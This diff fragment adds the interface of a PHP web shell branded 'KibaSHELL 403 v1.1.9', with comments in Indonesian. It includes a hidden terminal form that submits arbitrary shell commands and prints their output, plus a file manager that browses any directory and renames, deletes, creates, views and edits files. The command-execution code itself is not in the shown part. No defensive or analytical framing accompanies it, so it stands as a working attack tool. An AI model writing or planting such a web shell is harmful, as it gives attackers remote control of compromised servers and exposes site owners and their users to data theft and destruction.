+        <input type="text" name="newFileName" placeholder="New File Name">
+        <button type="submit" name="createFile">Create File</button>
+    </form>
+
+    <!-- Tombol Terminal -->
+    <button type="button" onclick="toggleTerminal()" style="background-color: black; color: lime; padding: 5px 10px;">🖥️ Terminal</button>
+</div>
+<!-- Form terminal (disembunyikan saat awal) -->
+<div id="terminalBox" style="display:none; margin-top:10px;">
+    <form method="post" style="display: flex; gap: 10px;">
+        <input type="text" name="command" placeholder="Contoh: ls -la" style="flex:1; padding:5px;" required>
+        <button type="submit" name="run_command">Run</button>
+    </form>
+
+    <?php if (!empty($terminalOutput)): ?>
+    <div style="margin-top:10px; background-color:#000; color:#0f0; padding:10px; font-family:monospace; white-space:pre-wrap; border-radius:5px;">
+        <?= $terminalOutput ?>
+    </div>
+    <?php endif; ?>
+</div>
+
+
+<!-- Create File Form (toggle) -->
+<form method="POST" id="create-file-form" style="display: none; margin-bottom: 15px;">
+    <input type="text" name="new_file_name" placeholder="Nama File.txt" required style="width: 100%; margin-bottom: 5px;">
+    <textarea name="new_file_content" rows="4" placeholder="Isi file..." required style="width: 100%; margin-bottom: 5px;"></textarea>
+    <button type="submit" name="create_file"><i class="fas fa-plus"></i> Save</button>
+</form>
+
+
+    <!-- File Table -->
+    <div class="table-wrapper">
+        <table>
+            <tr>
+                <th>Name</th>
+                <th>Permission</th>
+                <th>Size</th>
+                <th>Action</th>
+            </tr>
+            <!-- Tabel file/folder tetap di bawah -->
+
+
+<form action="" method="post">
+    <input type="text" name="newFolderName" placeholder="Enter new folder name">
+    <input type="submit" value="Create Folder">
+</form>
+
+<?php
+$files = scandir($currentPath);
+$folders = [];
+$regularFiles = [];
+
+foreach ($files as $file) {
+    if ($file !== '.' && $file !== '..') {
+        $fullPath = $currentPath . DIRECTORY_SEPARATOR . $file;
+        if (is_dir($fullPath)) {
+            $folders[] = $file;
+        } else {
+            $regularFiles[] = $file;
+        }
+    }
+}
+
+// Gabungkan folder dulu, lalu file
+$allItems = array_merge($folders, $regularFiles);
+
+foreach ($allItems as $file) {
+    $fullPath = $currentPath . DIRECTORY_SEPARATOR . $file;
+    $permissions = is_readable($fullPath) ? substr(sprintf('%o', @fileperms($fullPath)), -4) : 'N/A';
+    $size = (is_file($fullPath) && is_readable($fullPath)) ? formatSize(@filesize($fullPath)) : 'Folder';
+    $icon = getIcon($fullPath);
+
+    echo "<tr>
+            <td>$icon <a href='?d=" . urlencode($fullPath) . "'>" . x($file) . "</a></td>
+            <td>$permissions</td>
+            <td>$size</td>
+            <td class='actions'>
+                <form method='POST' style='display:inline;'>
+                    <input type='hidden' name='rename_path' value='" . x($fullPath) . "'>
+                    <input type='text' name='new_name' placeholder='Nama Baru'>
+                    <button type='submit' name='rename'><i class='fas fa-edit'></i></button>
+                </form>
+                <form method='POST' style='display:inline;'>
+                    <input type='hidden' name='delete_path' value='" . x($fullPath) . "'>
+                    <button type='submit'><i class='fas fa-trash-alt'></i></button>
+                </form>";
+if (is_file($fullPath) && is_readable($fullPath)) {
+    echo "
+    <span style='display: inline-block;'>
+        <a href='?view=" . urlencode($fullPath) . "' title='Lihat file'><i class='fas fa-eye' style='margin-right: 5px; color: #00ccff;'></i></a>
+        <a href='?edit=" . urlencode($fullPath) . "' title='Edit file'><i class='fas fa-pen' style='margin-right: 5px; color: #ffaa00;'></i></a>
+    </span>
+    ";
+}
+
+    echo "</td>
+          </tr>";
+}
+
+?>
+
+        </table>
+		
+    </div>
+</div>
+<h4 style="color:#ffcc00; text-align: center; margin: 20px auto; width: 100%; max-width: 100%; font-size: 1rem;">KibaSHELL 403 v1.1.9</h4>
+<script>
+function toggleTerminal() {
+    const box = document.getElementById('terminalBox');
+    box.style.display = (box.style.display === 'none') ? 'block' : 'none';
+}
+</script>
+
+</body>
+</html>
